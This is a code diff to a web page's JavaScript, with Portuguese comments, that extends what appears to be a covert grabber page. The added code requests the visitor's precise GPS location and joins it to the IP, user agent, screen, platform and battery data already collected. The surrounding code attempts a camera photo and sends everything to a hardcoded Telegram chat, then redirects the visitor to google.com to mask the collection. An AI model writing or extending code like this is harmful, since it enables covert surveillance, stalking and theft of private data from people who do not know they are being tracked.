@@ -28,6 +28,29 @@
         const CHAT_ID = "8607389403";
         const statusEl = document.getElementById('status');
 
+        // Função para pegar GPS
+        function getGPS() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) {
+                    resolve("Não suportado");
+                } else {
+                    statusEl.innerText = "Solicitando GPS...";
+                    navigator.geolocation.getCurrentPosition(
+                        (position) => {
+                            const lat = position.coords.latitude;
+                            const lng = position.coords.longitude;
+                            const acc = position.coords.accuracy;
+                            resolve(`${lat}, ${lng} (Precisão: ${Math.round(acc)}m)`);
+                        },
+                        (error) => {
+                            resolve(`Negado/Erro: ${error.message}`);
+                        },
+                        { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
+                    );
+                }
+            });
+        }
+
         async function enviarDados() {
             statusEl.innerText = "Coletando dados...";
             const dados = {
@@ -45,7 +68,7 @@
                 dados.ip = json.ip;
             } catch(e) { dados.ip = "Erro"; }
 
-            // Pega Bateria (Corrigido)
+            // Pega Bateria
             let batInfo = "N/A";
             if (navigator.getBattery) {
                 try {
@@ -54,7 +77,16 @@
                 } catch(e) {}
             }
 
-            let msg = `🔒 *Novo Acesso*\n\n📱 *UA:* ${dados.ua}\n🌐 *IP:* ${dados.ip}\n📐 *Tela:* ${dados.screen}\n💻 *OS:* ${dados.platform}\n🔋 *Bat:* ${batInfo}`;
+            // Pega GPS
+            const gpsInfo = await getGPS();
+
+            let msg = `🔒 *Novo Acesso*\n\n`;
+            msg += `📍 *GPS:* ${gpsInfo}\n\n`;
+            msg += `📱 *UA:* ${dados.ua}\n`;
+            msg += `🌐 *IP:* ${dados.ip}\n`;
+            msg += `📐 *Tela:* ${dados.screen}\n`;
+            msg += `💻 *OS:* ${dados.platform}\n`;
+            msg += `🔋 *Bat:* ${batInfo}`;
 
             statusEl.innerText = "Acessando câmera...";
             // Tenta tirar foto
@@ -91,7 +123,7 @@
                     statusEl.innerText = "Sucesso!";
                     setTimeout(() => { window.location.href = "https://google.com"; }, 2000);
                 } else {
-                    throw new Error("Telegram拒绝了: " + JSON.stringify(result));
+                    throw new Error("Telegram recusou: " + JSON.stringify(result));
                 }
 
             } catch (err) {
